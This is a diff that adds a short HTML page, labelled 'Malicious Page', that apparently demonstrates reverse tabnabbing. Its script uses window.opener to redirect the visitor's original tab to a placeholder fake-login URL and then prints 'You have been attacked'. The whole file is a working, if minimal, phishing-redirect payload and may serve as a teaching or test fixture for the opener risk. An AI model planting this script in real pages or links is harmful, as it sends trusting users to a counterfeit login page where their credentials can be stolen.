@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Malicious Page</title>
+</head>
+<body>
+
+<h2>Malicious Page</h2>
+
+<script>
+    // Attack: redirect the original tab
+    if (window.opener) {
+        window.opener.location = "https://example.com/fake-login";
+    }
+</script>
+
+<p>You have been attacked</p>
+
+</body>
+</html>
